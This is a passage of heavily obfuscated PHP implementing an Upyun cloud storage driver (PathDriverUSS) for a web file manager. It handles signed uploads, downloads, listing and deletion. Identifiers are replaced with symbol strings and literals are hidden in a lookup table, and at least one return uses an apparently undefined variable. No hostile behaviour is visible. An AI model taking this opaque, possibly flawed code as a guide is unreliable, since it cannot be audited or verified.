(!$¸‰Ü¨ å ? 1 : ceil($¸‰Ü¨ å / pow(1024, 3))) * 3600 * 4; $Æ¦‚´òÙ = $this->uploadMultiData($ÁÇ, $·®æáÁ¸); if ($Æ¦‚´òÙ) { $Æ¦‚´òÙ[$Áõµó°º[97]] = $ÁÇ; $Æ¦‚´òÙ[$Áõµó°º[98]] = $ş´Éîí†; } return $Æ¦‚´òÙ; } public function fileOutImage($‰ó»’šË, $€Œƒ­©Æ = 250) { if ($this->size($‰ó»’šË) > 1024 * 1024 * 25) { return $this->fileOutImageServer($‰ó»’šË, $€Œƒ­©Æ); } $æÅ˜‹›® = $this->link($‰ó»’šË); $æÅ˜‹›® .= $_SERVER[´‹ô¯Œ][1478] . $€Œƒ­©Æ; $this->fileOutLink($æÅ˜‹›®); } } goto c©¯½øÏÒ; cØ´Ğ…Ü²: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\x70\72\x2f\x2f\166\60\56\x61\x70\151\56\165\x70\x79\x75\156\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¦Ä‘Ò–) { parent::__construct(); $this->_init($¦Ä‘Ò–); } public function _init($Æ¿ß»ëµ) { $‹áÕ¯®– =& $_SERVER[´‹ô¯Œ]; foreach ($Æ¿ß»ëµ as $îÀÊªê => $Î˜å”‹Û) { if (isset($this->{$îÀÊªê})) { $this->{$îÀÊªê} = $Î˜å”‹Û; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($‹áÕ¯®–[1569] . LNG($‹áÕ¯®–[1489])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($±ÏÍ¸Ë‡, $öŸÜ¬ï = "\107\105\124") { $ŠÆÛ±÷ =& $_SERVER[´‹ô¯Œ]; $¼Ìƒì®ü = gmdate($ŠÆÛ±÷[1518]); $‰£ş ¸ = base64_encode(hash_hmac($ŠÆÛ±÷[1570], "{$öŸÜ¬ï}\x26{$±ÏÍ¸Ë‡}\x26{$¼Ìƒì®ü}", md5("{$this->userpass}"), !0)); $îÙâÍ®¥ = array("\101\165\x74\150\157\x72\x69\x7a\141\164\151\157\156\72\x55\120\x59\x55\x4e\x20{$this->username}\x3a{$‰£ş ¸}", "\104\141\164\x65\x3a{$¼Ìƒì®ü}"); return $îÙâÍ®¥; } public function ussRequest($¼ÄİÒƒ‹, $Ÿ¹‡·ËŸ = "\x47\x45\124", $å¢ú§«ø = false, $ò À£’ş = false, $èœƒÀ¾ù = false) { $ò¦½’› =& $_SERVER[´‹ô¯Œ]; $¼ÄİÒƒ‹ = trim($¼ÄİÒƒ‹, $ò¦½’›[8]); $‡©Îà€’ = "\57{$this->bucket}\57" . rawurlencode($¼ÄİÒƒ‹); $¶‚ˆÁ = $this->ussHeaders($‡©Îà€’, $Ÿ¹‡·ËŸ); if ($ò À£’ş) { $¶‚ˆÁ = array_merge($¶‚ˆÁ, $ò À£’ş); } $Œ‡û¦¦ø = url_request($this->endpoint . $‡©Îà€’, $Ÿ¹‡·ËŸ, $å¢ú§«ø, $¶‚ˆÁ, $èœƒÀ¾ù); if (!$Œ‡û¦¦ø) { $“ş›Ïá = LNG($ò¦½’›[1571]); $this->writeLog($“ş›Ïá); return array($ò¦½’›[1314] => !1, $ò¦½’›[1304] => $“ş›Ïá); } if (strtolower($Ÿ¹‡·ËŸ) == $ò¦½’›[230] || in_array($Œ‡û¦¦ø[$ò¦½’›[1314]], array($ò¦½’›[264], $ò¦½’›[1572]))) { $å¢ú§«ø = $Œ‡û¦¦ø[$ò¦½’›[1573]]; if (!$Œ‡û¦¦ø[$ò¦½’›[836]]) { $å¢ú§«ø = isset($å¢ú§«ø[0]) ? $å¢ú§«ø[0] : $ò¦½’›[12]; } } else { $å¢ú§«ø = json_decode($Œ‡û¦¦ø[$ò¦½’›[1304]], !0); if (!$å¢ú§«ø) { $å¢ú§«ø = $Œ‡û¦¦ø[$ò¦½’›[1304]]; } else { if (!$Œ‡û¦¦ø[$ò¦½’›[836]] && isset($å¢ú§«ø[$ò¦½’›[1574]])) { $å¢ú§«ø = $å¢ú§«ø[$ò¦½’›[1574]]; } } } if (!$Œ‡û¦¦ø[$ò¦½’›[836]]) { $this->writeLog($this->__errorMessage($å¢ú§«ø)); } return array($ò¦½’›[1314] => $Œ‡û¦¦ø[$ò¦½’›[836]], $ò¦½’›[1304] => $å¢ú§«ø); } private function __errorMessage($ìù İ„Â) { $È‚ƒµŒ´ =& $_SERVER[´‹ô¯Œ]; if (!$ìù İ„Â) { return $È‚ƒµŒ´[12]; } static $ŸÊ¯§–¦ = null; if (!$ŸÊ¯§–¦) { $ŸÊ¯§–¦ = I18n::getType(); } if ($ŸÊ¯§–¦ != $È‚ƒµŒ´[1527]) { return $ìù İ„Â; } $ÂÇû‚«¶ = array($È‚ƒµŒ´[1575] => $È‚ƒµŒ´[1576], $È‚ƒµŒ´[1577] => $È‚ƒµŒ´[1578], $È‚ƒµŒ´[1579] => $È‚ƒµŒ´[1578], $È‚ƒµŒ´[1580] => $È‚ƒµŒ´[1581], $È‚ƒµŒ´[1582] => $È‚ƒµŒ´[1583], $È‚ƒµŒ´[1584] => $È‚ƒµŒ´[1585], $È‚ƒµŒ´[1586] => $È‚ƒµŒ´[1587]); return isset($ÂÇû‚«¶[$ìù İ„Â]) ? $ÂÇû‚«¶[$ìù İ„Â] : $ìù İ„Â; } public function mkfile($ôÂüºÆİ, $ÙØ½ = '', $›šÜ¼ = REPEAT_RENAME) { if ($this->setContent($ôÂüºÆİ, $ÙØ½)) { return $this->getPathOuter($ôÂüºÆİ); } return !1; } public function mkdir($à³¾°Õ, $òÖõôœ‰ = REPEAT_SKIP) { $õö€€Ñü =& $_SERVER[´‹ô¯Œ]; $ĞÕèß»Î = trim($à³¾°Õ, $õö€€Ñü[8]); if ($this->_isFolder($ĞÕèß»Î)) { return $this->getPathOuter($ĞÕèß»Î); } $‡«ôƒåÄ = array($õö€€Ñü[1588]); $êêÏšÄÕ = $this->ussRequest($ĞÕèß»Î, $õö€€Ñü[291], !1, $‡«ôƒåÄ); return $êêÏšÄÕ[$õö€€Ñü[1314]] ? $this->getPathOuter($ĞÕèß»Î) : !1; } public function copyFile($ãÙè¶»´, $ÚÉŠâÖõ) { $Å¨úø =& $_SERVER[´‹ô¯Œ]; $¯çÆ‹ = array($Å¨úø[1589] . "\57{$this->bucket}\57{$ãÙè¶»´}", $Å¨úø[1590]); $öÍ±åÈ» = $this->ussRequest($ÚÉŠâÖõ, $Å¨úø[256], !1, $¯çÆ‹); return $öÍ±åÈ»[$Å¨úø[1314]] ? !0 : $this->getPathOuter($ÚÉŠâÖõ); } public function moveFile($›ôìµÃ¨, $Ù¬¦ÙÛ) { $¾¸å¦Õ© =& $_SERVER[´‹ô¯Œ]; $€¬†—÷Á = array($¾¸å¦Õ©[1591] . "\57{$this->bucket}\57{$›ôìµÃ¨}", $¾¸å¦Õ©[1590]); $˜Ëû£º = $this->ussRequest($Ù¬¦ÙÛ, $¾¸å¦Õ©[256], !1, $€¬†—÷Á); return $˜Ëû£º[$¾¸å¦Õ©[1314]] ? !0 : $this->getPathOuter($Ù¬¦ÙÛ); } public function delFile($£²­Ê¹…) { $Åƒ°Ìã =& $_SERVER[´‹ô¯Œ]; $Ô© ¦– = $this->ussRequest($£²­Ê¹…, $Åƒ°Ìã[1592]); return $Ô© ¦–[$Åƒ°Ìã[1314]] ? !0 : !1; } public function delFolder($Ÿ•ŠûÉá) { $Œ®Ô·– =& $_SERVER[´‹ô¯Œ]; if (!$this->exist($Ÿ•ŠûÉá)) { return !0; } $this->listItemCache = !1; $•ÚÛ€æÏ = $Ô™Ï£ù = array(); $this->fileList($Ÿ•ŠûÉá, $•ÚÛ€æÏ, $Ô™Ï£ù, !0); $this->listItemCache = !0; foreach ($Ô™Ï£ù as $îåïáû) { $Ç²º®Ú¥ = $this->ussRequest($îåïáû[$Œ®Ô·–[32]], $Œ®Ô·–[1592]); if (!$Ç²º®Ú¥[$Œ®Ô·–[1314]]) { return !1; } } usort($•ÚÛ€æÏ, function ($å‚ŞàÁ, $Ó™ïä) { $â˜ö²Èˆ =& $_SERVER[´‹ô¯Œ]; return substr_count($Ó™ïä, $â˜ö²Èˆ[8]) - substr_count($å‚ŞàÁ, $â˜ö²Èˆ[8]); }); foreach ($•ÚÛ€æÏ as $ĞÏÄè•) { $Ç²º®Ú¥ = $this->ussRequest($ĞÏÄè•, $Œ®Ô·–[1592]); if (!$Ç²º®Ú¥[$Œ®Ô·–[1314]]) { return !1; } } $Ç²º®Ú¥ = $this->ussRequest($Ÿ•ŠûÉá, $Œ®Ô·–[1592]); return $Ç²º®Ú¥[$Œ®Ô·–[1314]]; } public function rename($Å¶Á»Ç×, $Ÿ¸Ş¼ÎÜ) { if ($this->isFile($Å¶Á»Ç×)) { $Ÿ¸Ş¼ÎÜ = get_path_father($Å¶Á»Ç×) . $Ÿ¸Ş¼ÎÜ; return $this->moveFile($Å¶Á»Ç×, $Ÿ¸Ş¼ÎÜ); } return $this->renameObject($Å¶Á»Ç×, $Ÿ¸Ş¼ÎÜ); } public function fileInfo($Û¸òìƒê, $Ğ÷Î­¦ı = false, $½…ô˜í = array()) { $ÆØ‹É˜º =& $_SERVER[´‹ô¯Œ]; $Áï¹¬ÅÛ = array($ÆØ‹É˜º[32] => $this->pathThis($Û¸òìƒê), $ÆØ‹É˜º[87] => $this->getPathOuter($ÆØ‹É˜º[8] . $Û¸òìƒê), $ÆØ‹É˜º[33] => $ÆØ‹É˜º[233], $ÆØ‹É˜º[79] => isset($½…ô˜í[$ÆØ‹É˜º[79]]) ? $½…ô˜í[$ÆØ‹É˜º[79]] : 0, $ÆØ‹É˜º[169] => $this->ext($Û¸òìƒê)); if ($Ğ÷Î­¦ı) { return $Áï¹¬ÅÛ; } $Áï¹¬ÅÛ[$ÆØ‹É˜º[234]] = $Áï¹¬ÅÛ[$ÆØ‹É˜º[88]] = 0; $Áï¹¬ÅÛ[$ÆØ‹É˜º[235]] = $Áï¹¬ÅÛ[$ÆØ‹É˜º[236]] = !0; if (empty($½…ô˜í)) { $½…ô˜í = $this->objectMeta($Û¸òìƒê); if (!$½…ô˜í) { return $Áï¹¬ÅÛ; } } $Áï¹¬ÅÛ[$ÆØ‹É˜º[234]] = intval($½…ô˜í[$ÆØ‹É˜º[1593]]); $Áï¹¬ÅÛ[$ÆØ‹É˜º[88]] = intval($½…ô˜í[$ÆØ‹É˜º[1594]]); $Áï¹¬ÅÛ[$ÆØ‹É˜º[79]] = $½…ô˜í[$ÆØ‹É˜º[79]]; return $Áï¹¬ÅÛ; } public function folderInfo($™¸ğÓ¯ß, $ÎÜôØ–” = false) { $òµ‰œ¯ =& $_SERVER[´‹ô¯Œ]; $È°ó“‰æ = array($òµ‰œ¯[32] => $this->pathThis($™¸ğÓ¯ß), $òµ‰œ¯[87] => $this->getPathOuter($òµ‰œ¯[8] . $™¸ğÓ¯ß), $òµ‰œ¯[33] => $òµ‰œ¯[78]); if ($ÎÜôØ–”) { return $È°ó“‰æ; } $È°ó“‰æ[$òµ‰œ¯[234]] = $È°ó“‰æ[$òµ‰œ¯[88]] = 0; $È°ó“‰æ[$òµ‰œ¯[235]] = $È°ó“‰æ[$òµ‰œ¯[236]] = !0; if (empty($ˆÒ‚Ò¤“)) { $ˆÒ‚Ò¤“ = $this->objectMeta($™¸ğÓ¯ß); if (!$ˆÒ‚Ò¤“) { return $È°ó“‰æ; } } $È°ó“‰æ[$òµ‰œ¯[234]] = intval($ˆÒ‚Ò¤“[$òµ‰œ¯[1593]]); $È°ó“‰æ[$òµ‰œ¯[88]] = intval($ˆÒ‚Ò¤“[$òµ‰œ¯[1594]]); return $È°ó“‰æ; } private function listObjs($í×Õˆâá, $·…˜¤…õ = 0, $ğ×¥›Ş = 1000) { $¦¸ßÈÇÚ =& $_SERVER[´‹ô¯Œ]; $Ä“ÊÇŞ = array($¦¸ßÈÇÚ[1595], $¦¸ßÈÇÚ[1596] . $ğ×¥›Ş); if ($·…˜¤…õ) { $Ä“ÊÇŞ[] = $¦¸ßÈÇÚ[1597] . $·…˜¤…õ; } $•´ê¥Òñ = $this->ussRequest($í×Õˆâá, $¦¸ßÈÇÚ[1520], !1, $Ä“ÊÇŞ); return !$•´ê¥Òñ[$¦¸ßÈÇÚ[1314]] ? !1 : $•´ê¥Òñ[$¦¸ßÈÇÚ[1304]]; } private function fileList($Êà´ ‘¼, &$šîñÒã™, &$¨¶ñ‰¢, $“›æ«¡Æ = false) { $€€ÄÕÛô =& $_SERVER[´‹ô¯Œ]; $°Ğò³ = $€€ÄÕÛô[12]; $ñØ•ä¼ = 1000; $”ÊÍµï = rtrim($Êà´ ‘¼, $€€ÄÕÛô[8]) . $€€ÄÕÛô[8]; while (!0) { check_abort(); $ÀÎÍ—…¢ = $this->listObjs($Êà´ ‘¼, $°Ğò³, $ñØ•ä¼); if (!$ÀÎÍ—…¢) { return !1; } $°Ğò³ = isset($ÀÎÍ—…¢[$€€ÄÕÛô[1598]]) ? $ÀÎÍ—…¢[$€€ÄÕÛô[1598]] : $€€ÄÕÛô[12]; $·‡’ùûÏ = isset($ÀÎÍ—…¢[$€€ÄÕÛô[1599]]) ? $ÀÎÍ—…¢[$€€ÄÕÛô[1599]] : array(); foreach ($·‡’ùûÏ as $¨ÕûÙåˆ) { $È÷–Ğô¢ = $¨ÕûÙåˆ[$€€ÄÕÛô[33]] == $€€ÄÕÛô[78] ? !0 : !1; $¼Å’˜†ü = ltrim($”ÊÍµï . $¨ÕûÙåˆ[$€€ÄÕÛô[32]], $€€ÄÕÛô[8]) . ($È÷–Ğô¢ ? $€€ÄÕÛô[8] : $€€ÄÕÛô[12]); $ùŠ£ú‰ = array($€€ÄÕÛô[32] => $¼Å’˜†ü, $€€ÄÕÛô[33] => $È÷–Ğô¢ ? $€€ÄÕÛô[78] : $€€ÄÕÛô[233], $€€ÄÕÛô[79] => $¨ÕûÙåˆ[$€€ÄÕÛô[415]], $€€ÄÕÛô[1594] => $¨ÕûÙåˆ[$€€ÄÕÛô[1600]]); $this->cacheMethodInfoSet($¼Å’˜†ü, $È÷–Ğô¢, $ùŠ£ú‰); if ($È÷–Ğô¢) { $šîñÒã™[] = $¼Å’˜†ü; if ($“›æ«¡Æ) { $this->fileList($¼Å’˜†ü, $šîñÒã™, $¨¶ñ‰¢, $“›æ«¡Æ); } continue; } $¨¶ñ‰¢[] = $ùŠ£ú‰; } if (count($·‡’ùûÏ) < $ñØ•ä¼) { break; } } $this->cacheMethodInfoSet($Êà´ ‘¼, !0); } public function listPath($Šô¹Â¥, $Äüš©óß = false) { $”íû¦ú³ =& $_SERVER[´‹ô¯Œ]; $âÂï§ˆ = $ã®·¼„ = array(); $this->fileList($Šô¹Â¥, $âÂï§ˆ, $ã®·¼„); foreach ($âÂï§ˆ as $îèªÒÏÕ => $Ü‡Óƒ÷´) { $âÂï§ˆ[$îèªÒÏÕ] = $this->folderInfo($Ü‡Óƒ÷´, $Äüš©óß); } foreach ($ã®·¼„ as $îèªÒÏÕ => $Ü‡Óƒ÷´) { $ã®·¼„[$îèªÒÏÕ] = $this->fileInfo($Ü‡Óƒ÷´[$”íû¦ú³[32]], $Äüš©óß, $Ü‡Óƒ÷´); } return array($”íû¦ú³[85] => $âÂï§ˆ, $”íû¦ú³[86] => $ã®·¼„); } public function has($ƒ¼¨æÎŒ, $È’ —— = false, $î ¨¾ÙÇ = true) { $€ëçŸ¢æ =& $_SERVER[´‹ô¯Œ]; $Ê¼©şšÔ = $€ëçŸ¢æ[12]; $ÊÄ“®‚ô = 500; $Ö÷´ê»Ñ = 0; $Òö«Ùï = 0; $ë¡š¯é¥ = rtrim($ƒ¼¨æÎŒ, $€ëçŸ¢æ[8]) . $€ëçŸ¢æ[8]; while (!0) { check_abort(); $£éö•¥ = $this->listObjs($ƒ¼¨æÎŒ, $Ê¼©şšÔ, $ÊÄ“®‚ô); if (!$£éö•¥) { return !1; } $Ê¼©şšÔ = isset($£éö•¥[$€ëçŸ¢æ[1598]]) ? $£éö•¥[$€ëçŸ¢æ[1598]] : $€ëçŸ¢æ[12]; $ËÏÛÌÄ = isset($£éö•¥[$€ëçŸ¢æ[1599]]) ? $£éö•¥[$€ëçŸ¢æ[1599]] : array(); if (empty($ËÏÛÌÄ)) { break; } $ÉúõşÄù = array_filter($ËÏÛÌÄ, function ($¦íåé±¶) { $šüÃåé =& $_SERVER[´‹ô¯Œ]; return $¦íåé±¶[$šüÃåé[33]] == $šüÃåé[78]; }); $å ¾èıª = count($ËÏÛÌÄ); $ÉúõşÄù = count($ÉúõşÄù); $ØşıØÎš = $å ¾èıª - $ÉúõşÄù; if ($È’ ——) { $Òö«Ùï += $ÉúõşÄù; $Ö÷´ê»Ñ += $ØşıØÎš; if ($å ¾èıª < $ÊÄ“®‚ô) { break; } continue; } if ($î ¨¾ÙÇ) { if ($ØşıØÎš) { return !0; } } else { if ($ÉúõşÄù) { return !0; } } if ($å ¾èıª < $ÊÄ“®‚ô) { break; } } if ($È’ ——) { return array($€ëçŸ¢æ[242] => $Ö÷´ê»Ñ, $€ëçŸ¢æ[243] => $Òö«Ùï); } return !1; } public function listAll($œƒÉß—œ) { $ö°ËÔ—Ë =& $_SERVER[´‹ô¯Œ]; $¤áÖ‹İ£ = $ù¬Ïâ¤ = array(); $this->fileList($œƒÉß—œ, $¤áÖ‹İ£, $ù¬Ïâ¤, !0); $÷ßÒ¿µ¢ = array_to_keyvalue($ù¬Ïâ¤, $ö°ËÔ—Ë[32]); foreach ($¤áÖ‹İ£ as $¸î°ÃÎÜ) { if (is_string($¸î°ÃÎÜ)) { $÷ßÒ¿µ¢[$¸î°ÃÎÜ] = array($ö°ËÔ—Ë[79] => 0); } } return $this->listAllFiles($œƒÉß—œ, $÷ßÒ¿µ¢); } public function canRead($­™‡™‹) { return $this->exist($­™‡™‹) ? !0 : !1; } public function canWrite($èšÛ¿ğ’) { return $this->exist($èšÛ¿ğ’) ? !0 : !1; } public function getContent($ˆä“ìô) { return $this->fileSubstr($ˆä“ìô, 0, -1); } public function setContent($¢•³â‹à, $Å÷­ŒÒò = '') { $…¥â¶Ğ =& $_SERVER[´‹ô¯Œ]; if (!$Å÷­ŒÒò) { $ª©¶‚Î½ = $this->ussRequest($¢•³â‹à, $…¥â¶Ğ[291]); return $ª©¶‚Î½[$…¥â¶Ğ[1314]]; } $Ùªã¯óÔ = $this->tempFile($this->pathThis($¢•³â‹à)); file_put_contents($Ùªã¯óÔ, $Å÷­ŒÒò); if ($this->upload($¢•³â‹à, $Ùªã¯óÔ)) { $this->tempFileRemve($Ùªã¯óÔ); return !0; } return !1; } public function fileSubstr($Şî½×îé, $£¬ÁıÑí, $ŸªÑ–ö¬) { $ÙØ¸ıâ§ =& $_SERVER[´‹ô¯Œ]; if (!($ºÒ“’ôÇ = $this->link($Şî½×îé))) { return !1; } $‡çĞÃê‚ = !1; if ($ŸªÑ–ö¬ > 0) { $Šìùòã = $£¬ÁıÑí + $ŸªÑ–ö¬ - 1; $‡çĞÃê‚ = array($ÙØ¸ıâ§[1559] . $£¬ÁıÑí . $ÙØ¸ıâ§[465] . $Šìùòã); } $ıöÛæ±˜ = url_request($ºÒ“’ôÇ, $ÙØ¸ıâ§[1520], !1, $‡çĞÃê‚); return $ıöÛæ±˜[$ÙØ¸ıâ§[836]] ? $ıöÛæ±˜[$ÙØ¸ıâ§[1304]] : !1; } public function upload($Õá€ä¦¤, $‰¬˜ÀÖº, $Ê—İ¥ı§ = false, $Áî´¼ôã = REPEAT_REPLACE) { $Ë¾ïşïƒ =& $_SERVER[´‹ô¯Œ]; $Ç‹·–³ = IO::size($‰¬˜ÀÖº); if ($Ç‹·–³ <= 1024 * 1024 * 200) { $Õçš¸³ƒ = array($Ë¾ïşïƒ[1601] . $‰¬˜ÀÖº); $¯™»Ù»€ = $this->ussRequest($Õá€ä¦¤, $Ë¾ïşïƒ[256], $Õçš¸³ƒ); return $¯™»Ù»€[$Ë¾ïşïƒ[1314]] ? $this->getPathOuter($Õá€ä¦¤) : !1; } $·Å•Æ‚ğ = 1024 * 1024 * 10; $ÒöÊÎŠ« = array($Ë¾ïşïƒ[1602], $Ë¾ïşïƒ[1603] . $Ç‹·–³, $Ë¾ïşïƒ[1604], $Ë¾ïşïƒ[1605] . $·Å•Æ‚ğ); $¯™»Ù»€ = $this->ussRequest($Õá€ä¦¤, $Ë¾ïşïƒ[256], !1, $ÒöÊÎŠ«); if (!$¯™»Ù»€[$Ë¾ïşïƒ[1314]]) { return !1; } $Ô±§äªß = $¯™»Ù»€[$Ë¾ïşïƒ[1304]]; $ƒ‡Üç›È = 0; $ãç“¡¾ = $Ô±§äªß[$Ë¾ïşïƒ[1606]]; $ïîºÂ³ú = fopen($‰¬˜ÀÖº, $Ë¾ïşïƒ[1483]); if (!$ïîºÂ³ú) { return !1; } do { $òˆòø‘ğ = $Ô±§äªß[$Ë¾ïşïƒ[1607]]; fseek_64($ïîºÂ³ú, $ƒ‡Üç›È); $•íöÀ³· = fread($ïîºÂ³ú, $òˆòø‘ğ); $à¼ÌÒû† = 0; do { $à¼ÌÒû†++; $Ô±§äªß = $this->uploadPart($Õá€ä¦¤, $Ô±§äªß, $•íöÀ³·); } while (!$Ô±§äªß && $à¼ÌÒû† < 3); if (!$Ô±§äªß) { return !1; } $ãç“¡¾ = $Ô±§äªß[$Ë¾ïşïƒ[1606]]; $ƒ‡Üç›È += $òˆòø‘ğ; } while ($ãç“¡¾ != -1); fclose($ïîºÂ³ú); $ÒöÊÎŠ« = array($Ë¾ïşïƒ[1608], $Ë¾ïşïƒ[1609] . $Ô±§äªß[$Ë¾ïşïƒ[1610]], $Ë¾ïşïƒ[1604]); $¯™»Ù»€ = $this->ussRequest($Õá€ä¦¤, $Ë¾ïşïƒ[256], !1, $ÒöÊÎŠ«); return $¯™»Ù»€[$Ë¾ïşïƒ[1314]] ? $this->getPathOuter($—“÷¥­) : !1; } private function uploadPart($­İõÕÒµ, $¥õÆ…ëá, &$¨œÃá…³) { $Û¢Âá³ =& $_SERVER[´‹ô¯Œ]; $äÚí×…† = array($Û¢Âá³[1611], $Û¢Âá³[1609] . $¥õÆ…ëá[$Û¢Âá³[1610]], $Û¢Âá³[1612] . $¥õÆ…ëá[$Û¢Âá³[1606]], $Û¢Âá³[146] . $¥õÆ…ëá[$Û¢Âá³[1607]]); $ÉÁæàìñ = $this->ussRequest($­İõÕÒµ, $Û¢Âá³[256], $¨œÃá…³, $äÚí×…†); return !$ÉÁæàìñ[$Û¢Âá³[1314]] ? $ÉÁæàìñ[$Û¢Âá³[1314]] : $ÉÁæàìñ[$Û¢Âá³[1304]]; } public function uploadFormData($ûˆ¿ïƒÏ, $‹©Ù„™ş = 3600) { return $this->uploadPolicy($ûˆ¿ïƒÏ, $‹©Ù„™ş); } public function uploadMultiData($Ñß¿Ëøé, $¹ì¿£œº = 3600) { $»ÅŸá“ =& $_SERVER[´‹ô¯Œ]; $ùşº¯ = (int) $GLOBALS[$»ÅŸá“[7]][$»ÅŸá“[79]]; return $this->uploadPolicy($Ñß¿Ëøé, $¹ì¿£œº, $ùşº¯); } private function uploadPolicy($š‘˜ƒ§Ÿ, $Êß…ó = 3600, $²Ó…³¶ = 0) { $‘ìŠš”ù =& $_SERVER[´‹ô¯Œ]; $ŒÌÈä× = $‘ìŠš”ù[8] . $this->bucket; $š–ÛÈœø = gmdate($‘ìŠš”ù[1518]); $şşËöñÅ = array($‘ìŠš”ù[1613] => $this->bucket, $‘ìŠš”ù[1614] => $š‘˜ƒ§Ÿ, $‘ìŠš”ù[1615] => time() + $Êß…ó, $‘ìŠš”ù[1616] => $š–ÛÈœø); if ($²Ó…³¶) { $şşËöñÅ[$‘ìŠš”ù[1503]] = $²Ó…³¶; } $»›£éÈÃ = base64_encode(json_encode($şşËöñÅ)); $ëÜÆ¹–À = base64_encode(hash_hmac($‘ìŠš”ù[1570], "\x50\x4f\x53\x54\46{$ŒÌÈä×}\x26{$š–ÛÈœø}\46{$»›£éÈÃ}", md5("{$this->userpass}"), !0)); $«Æ‘›à = array($‘ìŠš”ù[280] => $»›£éÈÃ, $‘ìŠš”ù[1617] => "\x55\x50\131\125\116\40{$this->username}\72{$ëÜÆ¹–À}", $‘ìŠš”ù[209] => $this->endpoint . $ŒÌÈä×); return $«Æ‘›à; } public function download($›òñËşÕ, $»ïı°Ô) { $Èı®³¤É = IO::getPathInner(IO::mkfile($»ïı°Ô)); if (!($†ì˜åÖ = $this->link($›òñËşÕ))) { return !1; } $ùºèÚ˜– = 0; $Ú‚°çÂ– = 1024 * 200; $åÍ‰½ªø = fopen($Èı®³¤É, $_SERVER[´‹ô¯Œ][1565]); while (!0) { $”ûÖõ = $this->fileSubstr($›òñËşÕ, $ùºèÚ˜–, $Ú‚°çÂ–); if ($”ûÖõ === !1) { return !1; } fwrite($åÍ‰½ªø, $”ûÖõ); $ùºèÚ˜– += $Ú‚°çÂ–; if (strlen($”ûÖõ) < $Ú‚°çÂ–) { break; } } fclose($åÍ‰½ªø); return $»ïı°Ô; } public function link($¬ã±ú€è, $Œ»Ù‰ı = array()) { $§ÊèõÑ‚ =& $_SERVER[´‹ô¯Œ]; $¬ã±ú€è = trim($¬ã±ú€è, $§ÊèõÑ‚[8]); if (!empty($this->token)) { $áõª¸Š§ = strtotime(date($§ÊèõÑ‚[1618])); $ç¥¹ıÄÌ = substr(md5($this->token . $§ÊèõÑ‚[287] . $áõª¸Š§ . $§ÊèõÑ‚[1619] . $¬ã±ú€è), 12, 8) . $áõª¸Š§; $Œ»Ù‰ı[] = $§ÊèõÑ‚[1620] . $ç¥¹ıÄÌ; } $½Å½­Øî = !empty($Œ»Ù‰ı) ? $§ÊèõÑ‚[76] . implode($§ÊèõÑ‚[287], $Œ»Ù‰ı) : $§ÊèõÑ‚[12]; return $this->getHost() . $§ÊèõÑ‚[8] . $this->pathEncode($¬ã±ú€è) . $½Å½­Øî; } public function fileOut($úŞŞ«í», $¦Î˜¯ˆ¶ = false, $àä†å—Ï = false, $ıß›ß¤‡ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($úŞŞ«í», $¦Î˜¯ˆ¶, $àä†å—Ï, $ıß›ß¤‡); } if (!$àä†å—Ï) { $àä†å—Ï = $this->pathThis($úŞŞ«í»); } $şíÂÖ°ß = $¦Î˜¯ˆ¶ ? array($_SERVER[´‹ô¯Œ][1621] . rawurlencode($àä†å—Ï)) : array(); $¼©’¹¾ = $this->link($úŞŞ«í», $şíÂÖ°ß); $this->fileOutLink($¼©’¹¾); } public function fileOutServer($ñï—ŠÔ¸, $İûâ²úÎ = false, $ÓÎİ¨Ğº = false, $»á¢Òú¡ = '') { parent::fileOut($ñï—ŠÔ¸, $İûâ²úÎ, $ÓÎİ¨Ğº, $»á¢Òú¡); } public function fileOutImage($Òœµæåù, $œ÷¶—•º = 250) { $…ã¾˜Àç = $this->link($Òœµæåù . $_SERVER[´‹ô¯Œ][1622] . $œ÷¶—•º); $this->fileOutLink($…ã¾˜Àç); } public function fileOutImageServer($·Ú–èÛâ, $®øÉº = 250) { parent::fileOutImage($·Ú–èÛâ, $®øÉº); } public function hashMd5($°½ö™) { $ÌÒŸª¾Ø =& $_SERVER[´‹ô¯Œ]; $ä´¦ü•Ä = $this->_objectMeta($°½ö™); return isset($ä´¦ü•Ä[$ÌÒŸª¾Ø[248]]) ? $ä´¦ü•Ä[$ÌÒŸª¾Ø[248]] : !1; } public function size($¸Á×Ñº) { $û™ñí©‚ = $this->objectMeta($¸Á×Ñº); return $û™ñí©‚ ? $û™ñí©‚[$_SERVER[´‹ô¯Œ][79]] : 0; } public function info($ÔåÀ¯úò) { if ($this->isFolder($ÔåÀ¯úò)) { return $this->folderInfo($ÔåÀ¯úò); } else { if ($this->isFile($ÔåÀ¯úò)) { return $this->fileInfo($ÔåÀ¯úò); } } return !1; } public function exist($î¯¿”ç°) { return $this->isFile($î¯¿”ç°) || $this->isFolder($î¯¿”ç°); } public function isFile($‰şş»İô) { return !$this->isFolder($‰şş»İô) && $this->objectMeta($‰şş»İô); } public function isFolder($”‹İ½Â‹) { return $this->cacheMethod($_SERVER[´‹ô¯Œ][180], $”‹İ½Â‹); } protected function objectMeta($ùïï¶èô) { return $this->cacheMethod($_SERVER[´‹ô¯Œ][182], $ùïï¶èô); } protected function _objectMeta($ŠõÏ·‡) { $‡İÕì·“ =& $_SERVER[´‹ô¯Œ]; if ($ŠõÏ·‡ == $‡İÕì·“[12] || $ŠõÏ·‡ == $‡İÕì·“[8]) { return array(); } $ŞÅÔ÷Ãé = $this->ussRequest($ŠõÏ·‡, $‡İÕì·“[1623]); if (!$ŞÅÔ÷Ãé[$‡İÕì·“[1314]]) { return null; } $ùğøÃ£ = isset($ŞÅÔ÷Ãé[$‡İÕì·“[1304]]) ? $ŞÅÔ÷Ãé[$‡İÕì·“[1304]] : array(); if (!isset($ùğøÃ£[$‡İÕì·“[1624]])) { return null; } $Ö‰‚çÁ· = array($‡İÕì·“[33] => isset($ùğøÃ£[$‡İÕì·“[1624]]) ? $ùğøÃ£[$‡İÕì·“[1624]] : null, $‡İÕì·“[79] => isset($ùğøÃ£[$‡İÕì·“[1625]]) ? $ùğøÃ£[$‡İÕì·“[1625]] : null, $‡İÕì·“[248] => isset($ùğøÃ£[$‡İÕì·“[1626]]) ? $ùğøÃ£[$‡İÕì·“[1626]] : null, $‡İÕì·“[1593] => isset($ùğøÃ£[$‡İÕì·“[1627]]) ? 